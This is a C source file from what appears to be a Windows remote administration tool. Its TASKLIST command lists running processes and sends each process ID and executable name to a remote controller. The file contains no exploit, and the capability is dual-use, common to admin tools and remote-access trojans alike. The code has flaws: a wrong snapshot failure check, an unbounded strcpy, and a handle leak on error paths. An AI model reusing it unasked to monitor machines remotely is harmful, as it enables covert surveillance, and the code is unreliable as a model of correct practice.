#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <TlHelp32.h>
#include "commands/cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"

#define SERV_TASKLIST_NAME_MAX 256
#define SERV_TASKLIST_MAX 1024

#define SERV_TASKLIST_DATA 0x1
#define SERV_TASKLIST_END 0x2

#define SERV_TASKLIST_FAILED 0x0F

int cmds_TASKLIST(void)
{
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(!snap)
	{
		if(net_SendEmptyCmd(SERV_TASKLIST_FAILED) < 1)
		{
			return 0;
		}

		return 1;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	if(!Process32First(snap, &pe))
	{
		CloseHandle(snap);

		if(net_SendEmptyCmd(SERV_TASKLIST_FAILED) < 1)
		{
			return 0;
		}

		return 1;
	}else{
		if(net_SendEmptyCmd(CMDS_TASK_LIST) < 1)
		{
			return 0;
		}

		uint8* rmsg;
		char buff[net_MaxContLen];
		memset(buff, 0, net_MaxContLen);

		buff[0] = ((pe.th32ProcessID >> 24) & 0xFF);
		buff[1] = ((pe.th32ProcessID >> 16) & 0xFF);
		buff[2] = ((pe.th32ProcessID >> 8) & 0xFF);
		buff[3] = (pe.th32ProcessID & 0xFF);

		strcpy(buff + 4, (char*)pe.szExeFile);

		if(net_SendCmd((uint8*)buff, strlen(buff + 4) + 4, SERV_TASKLIST_DATA) < 1)
		{
			return 0;
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			return 0;
		}
	
		free(rmsg);
		pe.dwSize = sizeof(PROCESSENTRY32);

		while(Process32Next(snap, &pe))
		{
			memset(buff, 0, net_MaxContLen);
			
			buff[0] = ((pe.th32ProcessID >> 24) & 0xFF);
			buff[1] = ((pe.th32ProcessID >> 16) & 0xFF);
			buff[2] = ((pe.th32ProcessID >> 8) & 0xFF);
			buff[3] = (pe.th32ProcessID & 0xFF);
	
			strcpy(buff + 4, (char*)pe.szExeFile);
	
			if(net_SendCmd((uint8*)buff, strlen(buff + 4) + 4, SERV_TASKLIST_DATA) < 1)
			{
				return 0;
			}
	
			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				return 0;
			}
		
			free(rmsg);
		}

		if(net_SendEmptyCmd(SERV_TASKLIST_END) < 1)
		{
			return 0;
		}
	}

	CloseHandle(snap);

	return 1;
}